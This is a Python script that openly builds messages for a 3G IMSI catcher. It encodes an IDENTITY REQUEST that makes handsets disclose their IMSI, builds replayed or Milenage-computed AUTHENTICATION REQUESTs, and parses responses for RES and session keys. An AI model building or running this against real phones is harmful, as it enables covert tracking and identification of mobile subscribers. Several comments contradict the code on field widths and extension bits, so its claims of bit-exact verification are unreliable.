#!/usr/bin/env python3
"""The two messages a 3G catcher still had to be able to write.

Everything here is derived field by field from ETSI TS 125 331 v6.4.0, read
locally (the ASN.1 is in clause 10.2; the PER rules are clause 12 and X.691).
Nothing is guessed, and every path that would need a value this tool does not
have refuses instead of inventing one.

  identity   MM IDENTITY REQUEST carrying an IMSI request, wrapped in an RRC
             DL-DIRECT TRANSFER. This is the message that yields the subscriber
             identity, so it is the one worth being exact about.

             TS 24.008 9.2.5 IDENTITY REQUEST:
               protocol discriminator 0x05, skip indicator 0x00,
               message type 0x18, identity type IE 0x08 with value 0x01 (IMSI)

             RRC DL-DCCH-Message (TS 25.331 10.2 DL-DCCH-Message):
               integrityCheckInfo OPTIONAL        1 bit, 0 = absent
               DL-DCCH-MessageType CHOICE (32)    5 bits, 5 = downlinkDirectTransfer
               DownlinkDirectTransfer CHOICE(2)   1 bit, 0 = r3
                 rrc-TransactionIdentifier        2 bits
                 cn-DomainIdentity                1 bit, 0 = cs-domain
                 laterNonCriticalExtensions       1 bit, 0 = absent
               nas-Message OCTET STRING           length octet, then the PDU

  auth       MM AUTHENTICATION REQUEST (0x12) carrying RAND and AUTN, and the
             parse of an AUTHENTICATION RESPONSE. A catcher does not break AKA:
             it replays an AUTHENTICATION REQUEST it has seen once and takes the
             RES that follows, so what this needs is the two values, not K.

Exit codes: 0 built, 1 bad input, 2 the request cannot be built as asked.
"""
import argparse
import struct
import sys

PD_MM = 0x05
SKIP = 0x00
MSG_IDENTITY_REQUEST = 0x18
MSG_AUTH_REQUEST = 0x12
MSG_AUTH_RESPONSE = 0x13
IE_IDENTITY_TYPE = 0x08
ID_TYPE = {"imsi": 0x01, "imei": 0x02, "imeisv": 0x03, "tmsi": 0x04}

DL_DCCH_INDEX_DOWNLINK_DIRECT_TRANSFER = 5
GSMTAP_PORT = 4729
GSMTAP_TYPE_UM = 12


def err(msg, why=None):
    sys.stderr.write("ERROR\t%s\n" % msg)
    if why:
        sys.stderr.write("WHY\t%s\n" % why)
    return 2


def bits_append(acc, value, width):
    acc.append(format(value, "0%db" % width))


def bits_to_bytes(bits):
    pad = (8 - len(bits) % 8) % 8
    bits += "0" * pad
    return bytes(int(bits[i:i + 8], 2) for i in range(0, len(bits), 8)), pad


def mm_identity_request(identity="imsi"):
    """TS 24.008 9.2.5, the whole message: four octets and no optional parts.

    Identity type is a type-1 IE: the value sits in the low half of one octet and
    there is no IEI in front of it. Writing 0x08 first would be the layout of a
    type-2 IE and would make the message refuse on the handset.
    """
    value = ID_TYPE[identity]
    return bytes([PD_MM, SKIP, MSG_IDENTITY_REQUEST, value])


def rrc_direct_transfer(nas, txid=0, domain="cs"):
    """TS 25.331 10.2, DL-DCCH-Message carrying a DownlinkDirectTransfer."""
    if txid not in range(4):
        raise ValueError("rrc-TransactionIdentifier is 0..3, got %r" % (txid,))
    if domain not in ("cs", "ps"):
        raise ValueError("cn-DomainIdentity is cs-domain or ps-domain, got %r" % (domain,))
    # The layout below is read off pycrate, not off the prose: the CHOICE index
    # is SIX bits (bits 1..6), r3 is bit 7, the transaction identifier is bits
    # 8..9, the CN domain is bit 10, and the NAS length is bits 11..22 as a
    # 12-bit (n-1) -- nas-Message is OCTET STRING (SIZE(1..4096)), so the length
    # is the value minus one in a field wide enough for the upper bound. There is
    # no separate presence bit for laterNonCriticalExtensions; adding one, as the
    # first version of this function did, is what made pycrate reject the message
    # with "bitlen overflow". Verified by tools/umts_rrc_oracle.py.
    acc = []
    bits_append(acc, 0, 1)                                        # integrityCheckInfo absent
    bits_append(acc, DL_DCCH_INDEX_DOWNLINK_DIRECT_TRANSFER, 5)    # CHOICE, five bits
    bits_append(acc, 0, 1)                                        # DownlinkDirectTransfer r3
    bits_append(acc, 0, 1)                                        # r3 SEQUENCE extension absent
    bits_append(acc, txid, 2)                                     # rrc-TransactionIdentifier
    bits_append(acc, 0 if domain == "cs" else 1, 1)               # cn-DomainIdentity
    bits_append(acc, len(nas) - 1, 12)                            # nas-Message (n-1), 12 bits
    for byte in nas:
        bits_append(acc, byte, 8)
    bits = "".join(acc)
    out, pad = bits_to_bytes(bits)
    # The meaningful length is the whole bit string; `pad` is what packing added
    # on top of it. Reporting len(bits) - pad counted the message one bit short,
    # which made a correct hex disagree with the referee on its length.
    return out, len(bits), pad


def pcap_ul_frames(raw):
    """Return framing metadata and payloads from classic raw-IP GSMTAP pcaps.

    This helper validates capture/IP/UDP/GSMTAP boundaries. It intentionally
    does not inspect RRC contents. IPv4 options and IPv6 extensions are skipped.
    """
    magics = {
        b"\xd4\xc3\xb2\xa1": "<", b"\xa1\xb2\xc3\xd4": ">",
        b"\x4d\x3c\xb2\xa1": "<", b"\xa1\xb2\x3c\x4d": ">",
    }
    if len(raw) < 24 or raw[:4] not in magics:
        raise ValueError("not a complete classic pcap")
    endian = magics[raw[:4]]
    linktype = struct.unpack_from(endian + "I", raw, 20)[0]
    if linktype not in (101, 12):
        raise ValueError("linktype %d, expected raw IP (101)" % linktype)
    frames = []
    off = 24
    record = 0
    while off < len(raw):
        if off + 16 > len(raw):
            raise ValueError("truncated pcap record header at offset %d" % off)
        sec, fraction, caplen, origlen = struct.unpack_from(endian + "IIII", raw, off)
        off += 16
        if caplen > len(raw) - off:
            raise ValueError("truncated pcap packet at record %d" % record)
        data = raw[off:off + caplen]
        off += caplen
        record += 1
        if origlen < caplen:
            raise ValueError("pcap original length is smaller than captured length")
        if not data:
            continue
        version = data[0] >> 4
        if version == 4:
            if len(data) < 20 or (data[0] & 0x0f) != 5 or data[9] != 17:
                continue
            total = int.from_bytes(data[2:4], "big")
            if total < 28 or total > len(data):
                continue
            udp = data[20:total]
        elif version == 6:
            if len(data) < 40 or data[6] != 17:
                continue
            plen = int.from_bytes(data[4:6], "big")
            if plen < 8 or 40 + plen > len(data):
                continue
            udp = data[40:40 + plen]
        else:
            continue
        if len(udp) < 8:
            continue
        src, dst, udp_len = struct.unpack_from("!HHH", udp, 0)
        if GSMTAP_PORT not in (src, dst) or udp_len < 8 or udp_len > len(udp):
            continue
        gt = udp[8:udp_len]
        if len(gt) < 16 or gt[0] != 2 or gt[2] != GSMTAP_TYPE_UM:
            continue
        hdrlen = gt[1] * 4
        if hdrlen < 16 or hdrlen > len(gt):
            continue
        frames.append((gt[12], gt[hdrlen:], sec, fraction))
    return frames


def analyze_pcap(path):
    with open(path, "rb") as f:
        frames = pcap_ul_frames(f.read())
    for index, (subtype, payload, sec, fraction) in enumerate(frames, 1):
        # GSMTAP UM RRC subtype values per libosmocore: 4=DCCH, 8=DCH.
        channel = {4: "DCCH", 8: "DCH"}.get(subtype, "other")
        print("frame\t%d\t%d.%06d\t%d\t%s\t%d" %
              (index, sec, fraction, subtype, channel, len(payload)))
    print("frames\t%d" % len(frames))
    print("scope\tGSMTAP UM RRC framing metadata only; payload not decoded")


def mm_auth_request(rand, autn, cipher=False):
    """TS 24.008 9.2.1 AUTHENTICATION REQUEST: RAND (0x21) then AUTN (0x20)."""
    if len(rand) != 16 or len(autn) != 16:
        raise ValueError("RAND and AUTN are 16 octets each (TS 33.102 6.3.3)")
    body = bytes([PD_MM, SKIP, MSG_AUTH_REQUEST])
    body += bytes([0x21, len(rand)]) + rand
    body += bytes([0x20, len(autn)]) + autn
    if cipher:
        body += bytes([0x08, 0x01])   # ciphering key sequence number
    return body


def milenage_autn(args):
    """AUTN = (SQN xor f5) || AMF || f1, with f1 and f5 from tools/gsm_crypto.py.

    That tool is the tree's Milenage, and it is held against TS 35.208 test set 1
    by modules/16_sim.sh --sim-auth-check, so this path is a consumer of a checked
    primitive rather than a second implementation of it. Returns None after
    printing a refusal when the inputs are wrong or the tool is missing.
    """
    import os
    import shutil
    import subprocess

    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    tool = os.path.join(root, "tools", "gsm_crypto.py")
    if not os.path.exists(tool):
        err("tools/gsm_crypto.py is not in this tree", "the Milenage path lives there")
        return None
    if args.op is None and args.opc is None:
        err("--ki also needs --op or --opc", "the operator variant is part of the key material")
        return None
    if args.sqn is None:
        err("--ki also needs --sqn", "the sequence number is what makes this AUTN fresh")
        return None
    try:
        ki = bytes.fromhex(args.ki)
        op = bytes.fromhex(args.op) if args.op else None
        opc = bytes.fromhex(args.opc) if args.opc else None
        sqn = bytes.fromhex(args.sqn)
        amf = bytes.fromhex(args.amf)
        rand = bytes.fromhex(args.rand) if args.rand else os.urandom(16)
    except ValueError:
        err("--ki, --op/--opc, --sqn, --amf and --rand take hex", "16, 16, 6, 2 and 16 octets")
        return None
    if len(ki) != 16 or len(rand) != 16 or len(sqn) != 6 or len(amf) != 2:
        err("wrong lengths", "K is 16 octets, RAND 16, SQN 6, AMF 2")
        return None
    cmd = [shutil.which("python3") or "python3", tool, "--milenage",
           "--ki", ki.hex(), "--rand", rand.hex(), "--sqn", sqn.hex(), "--amf", amf.hex()]
    cmd += ["--op", op.hex()] if op is not None else ["--opc", opc.hex()]
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=20).stdout
    except (OSError, subprocess.SubprocessError):
        err("could not run tools/gsm_crypto.py", "the Milenage path needs python3")
        return None
    got = {}
    for line in out.splitlines():
        parts = line.split("\t")
        if len(parts) >= 2:
            got[parts[0]] = parts[1].strip()
    if "f1" not in got or "f5" not in got:
        err("tools/gsm_crypto.py did not answer with f1 and f5", "it is the only Milenage in this tree")
        return None
    f1 = bytes.fromhex(got["f1"])
    f5 = bytes.fromhex(got["f5"])
    ak = (int.from_bytes(sqn, "big") ^ int.from_bytes(f5, "big")).to_bytes(6, "big")
    autn = ak + amf + f1
    return (rand, autn, got.get("opc", ""), got["f1"], got["f5"], sqn.hex().upper())


def parse_auth_response(hexs):
    raw = bytes.fromhex(hexs)
    if len(raw) < 3:
        raise ValueError("too short for an MM message")
    if raw[0] != PD_MM:
        raise ValueError("protocol discriminator is 0x%02x, not MM (0x05)" % raw[0])
    if raw[2] != MSG_AUTH_RESPONSE:
        raise ValueError("message type is 0x%02x, not AUTHENTICATION RESPONSE (0x13)" % raw[2])
    out = {"protocol_discriminator": "%02x" % raw[0], "message_type": "%02x" % raw[2]}
    i = 3
    while i + 1 < len(raw):
        iei, ln = raw[i], raw[i + 1]
        value = raw[i + 2:i + 2 + ln]
        if iei == 0x22:
            out["res"] = value.hex()
        elif iei == 0x23:
            out["sres"] = value.hex()
        elif iei == 0x27:
            out["ck"] = value.hex()
        elif iei == 0x28:
            out["ik"] = value.hex()
        elif iei == 0x29:
            out["kc"] = value.hex()
        else:
            out["ie_%02x" % iei] = value.hex()
        i += 2 + ln
    return out


def emit(rows):
    for key, value in rows:
        sys.stdout.write("%s\t%s\n" % (key, value))


def main(argv):
    ap = argparse.ArgumentParser(description="3G catcher message builders (TS 24.008 / 25.331)")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("identity", help="MM IDENTITY REQUEST in an RRC DL DIRECT TRANSFER")
    p.add_argument("--identity", default="imsi", choices=sorted(ID_TYPE))
    p.add_argument("--txid", type=int, default=0)
    p.add_argument("--domain", default="cs", choices=("cs", "ps"))
    p.add_argument("--bare", action="store_true", help="the MM PDU alone, without the RRC wrapper")

    p = sub.add_parser("auth", help="MM AUTHENTICATION REQUEST (replay of RAND and AUTN)")
    p.add_argument("--rand", default=None)
    p.add_argument("--autn", default=None)
    p.add_argument("--ksi", default=None, help="ciphering key sequence number 0..7")
    # The other way to get an AUTN: compute one, which needs the subscriber key.
    # Legal only for a SIM you own, and it is the difference between replaying
    # an exchange and being able to start a new one.
    p.add_argument("--ki", default=None, help="subscriber key K, 16 octets, for a SIM you own")
    p.add_argument("--op", default=None, help="operator variant OP, 16 octets")
    p.add_argument("--opc", default=None, help="OPc if you hold it instead of OP")
    p.add_argument("--sqn", default=None, help="SQN, 6 octets")
    p.add_argument("--amf", default="B9B9", help="AMF, 2 octets (default B9B9)")

    p = sub.add_parser("auth-response", help="read an AUTHENTICATION RESPONSE back")
    p.add_argument("hex")

    p = sub.add_parser("pcap-analyze", help="passively summarize GSMTAP UM RRC frame metadata")
    p.add_argument("pcap")

    args = ap.parse_args(argv)
    if args.cmd == "pcap-analyze":
        try:
            analyze_pcap(args.pcap)
        except (OSError, ValueError, struct.error) as exc:
            return err(str(exc), "reads classic pcap raw-IP GSMTAP framing only")
        return 0

    if args.cmd == "identity":
        try:
            mm = mm_identity_request(args.identity)
        except KeyError:
            return err("unknown identity type %s" % args.identity)
        emit([("mm_hex", mm.hex()),
              ("mm_bytes", len(mm)),
              ("ref", "TS 24.008 9.2.5 IDENTITY REQUEST; identity type (type 1 IE) = %02x" % ID_TYPE[args.identity])])
        if args.bare:
            return 0
        try:
            rrc, nbits, pad = rrc_direct_transfer(mm, args.txid, args.domain)
        except ValueError as exc:
            return err(str(exc), "the fields are range-checked against the ASN.1 rather than clamped")
        emit([("rrc_hex", rrc.hex()),
              ("rrc_bytes", len(rrc)),
              ("rrc_bits", nbits),
              ("rrc_pad_bits", pad),
              ("channel", "dl-dcch"),
              ("type_index", DL_DCCH_INDEX_DOWNLINK_DIRECT_TRANSFER),
              ("type_name", "downlinkDirectTransfer"),
              ("integrity_check_info", "absent"),
              ("rrc_transaction_identifier", args.txid),
              ("cn_domain_identity", args.domain + "-domain"),
              ("verified", "bit for bit against the pycrate transcription of "
               "TS 25.331 (tools/umts_rrc_oracle.py, 35 checks): the CHOICE index "
               "is five bits, the r3 SEQUENCE carries an extension bit, and the "
               "NAS length is a 12-bit (n-1) because nas-Message is OCTET STRING "
               "SIZE(1..4096)"),
              ("ref", "TS 25.331 10.2 DL-DCCH-Message, DownlinkDirectTransfer-r3-IEs")])
        return 0

    if args.cmd == "auth":
        computed = None
        if args.ki is not None:
            computed = milenage_autn(args)
            if computed is None:
                return 2
            rand, autn, opc, f1, f5, sqn = computed
        elif args.rand is None or args.autn is None:
            return err("--rand and --autn are both needed, or --ki with --op/--opc and --sqn",
                       "a replay takes the pair a real network sent; a computed one takes the key")
        else:
            try:
                rand = bytes.fromhex(args.rand)
                autn = bytes.fromhex(args.autn)
            except ValueError:
                return err("--rand and --autn take hex", "16 octets each")
        try:
            pdu = mm_auth_request(rand, autn, cipher=args.ksi is not None)
        except ValueError as exc:
            return err(str(exc), "RAND and AUTN are the two 16-octet values an AUTHENTICATION REQUEST carries")
        emit([("mm_hex", pdu.hex()),
              ("mm_bytes", len(pdu)),
              ("rand", rand.hex()),
              ("autn", autn.hex()),
              ("what_it_is", "a replay: the same RAND and AUTN the real network sent once, addressed at the next handset"
                              if computed is None else
                              "a fresh AUTHENTICATION REQUEST for a SIM whose K you hold"),
              ("what_it_is_not", "an AKA break: without a key this tool computes no MAC, and a handset that has never seen this RAND and AUTN will reject it"),
              ("ref", "TS 24.008 9.2.1 AUTHENTICATION REQUEST; TS 33.102 6.3.3")] +
             ([] if computed is None else [
              ("milenage_opc", opc),
              ("milenage_f1", f1),
              ("milenage_f5", f5),
              ("sqn", sqn),
              ("how_the_autn_was_made", "(SQN xor f5) || AMF || f1, TS 33.102 6.3.3, from the key named on the command line"),
              ("what_it_is_now", "a fresh AUTN for a SIM whose K you hold: a handset with that SIM accepts it, because the MAC it checks is the MAC that was computed"),
              ("holds", "your key, for your SIM, and nothing else"),
              ("ref_key", "TS 35.205/35.206/35.208; the vector this path is checked against is TS 35.208 set 1")]))
        return 0

    if args.cmd == "auth-response":
        try:
            rows = parse_auth_response(args.hex)
        except ValueError as exc:
            return err(str(exc))
        for key in sorted(rows):
            emit([(key, rows[key])])
        emit([("ref", "TS 24.008 9.2.2 AUTHENTICATION RESPONSE; RES 0x22, CK 0x27, IK 0x28")])
        return 0

    return 2


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
